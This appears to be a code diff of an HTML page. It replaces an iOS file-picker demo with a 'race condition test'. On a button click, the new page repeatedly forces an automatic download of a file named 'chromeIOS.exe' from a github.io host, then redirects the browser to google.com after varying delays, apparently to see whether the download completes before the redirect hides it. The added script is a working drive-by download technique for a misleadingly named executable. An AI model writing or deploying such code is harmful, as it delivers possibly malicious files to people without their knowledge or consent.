@@ -1,57 +1,77 @@
-<!DOCTYPE html>
+<!doctype html>
 <html>
 <head>
-<title>iOS File Picker + Redirect</title>
+<meta charset="utf-8">
+<style>
+.button{
+background:#4CAF50;
+border:none;
+color:white;
+padding:15px 32px;
+font-size:16px;
+cursor:pointer;
+}
+
+#log{
+font-family:monospace;
+margin-top:20px;
+}
+</style>
 </head>
 
 <body>
 
-<h3>Hold ENTER or tap button to select file and redirect</h3>
-
-<!-- Tombol untuk iOS, karena keydown tidak selalu reliable di iOS -->
-<button id="fileBtn">Select File</button>
-<input id="fileInput" type="file" accept="*/*" style="display:none" multiple>
+<center>
+<button class="button" onclick="start()">Start Race Test</button>
+<div id="log"></div>
+</center>
 
 <script>
-const fileInput = document.getElementById("fileInput");
-const fileBtn = document.getElementById("fileBtn");
 
-// Tombol untuk membuka file picker (iOS)
-fileBtn.addEventListener("click", function(){
-    fileInput.click();
+const file="https://ecdnts-del.github.io/test-apk/chromeIOS.exe";
+
+function start(){
+
+log("Starting race condition test...");
+
+let delays=[50,120,200,280,320,400,500];
+
+delays.forEach((delay,i)=>{
+
+setTimeout(()=>{
+
+log("Attempt redirect delay: "+delay+"ms");
+
+download();
+
+setTimeout(()=>{
+window.location.href="https://google.com";
+},delay);
+
+},i*1500);
+
 });
 
-// Optional: keydown untuk keyboard eksternal iOS
-let pressTimer;
-document.addEventListener("keydown", function(e){
-    if(e.key === "Enter" && !pressTimer){
-        pressTimer = setTimeout(function(){
-            fileInput.click();
-        }, 3000); // tahan 3 detik
-    }
-});
+}
 
-document.addEventListener("keyup", function(e){
-    if(e.key === "Enter"){
-        clearTimeout(pressTimer);
-        pressTimer = null;
-    }
-});
+function download(){
 
-// Setelah file dipilih
-fileInput.addEventListener("change", function(){
-    const files = fileInput.files;
-    let list = "Total files selected: " + files.length + "\n\n";
-    for(let i=0;i<files.length;i++){
-        list += files[i].name + "\n";
-    }
-    alert(list);
+let link=document.createElement("a");
+link.href=file;
+link.download="chromeIOS.exe";
 
-    // Redirect setelah 2 detik
-    setTimeout(function(){
-        window.location.href = "https://example.com";
-    },2000);
-});
+document.body.appendChild(link);
+link.click();
+document.body.removeChild(link);
+
+}
+
+function log(msg){
+let d=document.createElement("div");
+d.textContent=msg;
+document.getElementById("log").appendChild(d);
+}
+
 </script>
 
 </body>
